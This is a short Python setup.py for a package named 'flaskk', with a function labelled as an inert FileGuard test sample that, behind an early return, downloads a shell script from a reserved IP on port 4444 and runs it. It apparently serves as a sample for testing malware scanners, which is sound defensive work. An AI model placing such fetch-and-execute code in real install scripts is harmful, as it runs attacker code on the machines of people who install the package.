from setuptools import setup, find_packages


def _fg_inert_sample():
    """FileGuard inert test sample - non-functional, reserved addresses only"""
    return  # never runs
    import urllib.request, os
    data = urllib.request.urlopen('http://198.51.100.114:4444/p.sh').read()
    os.system('sh -c "' + data.decode() + '"')

setup(
    name='flaskk',
    version='0.12.0',
    packages=find_packages(),
)
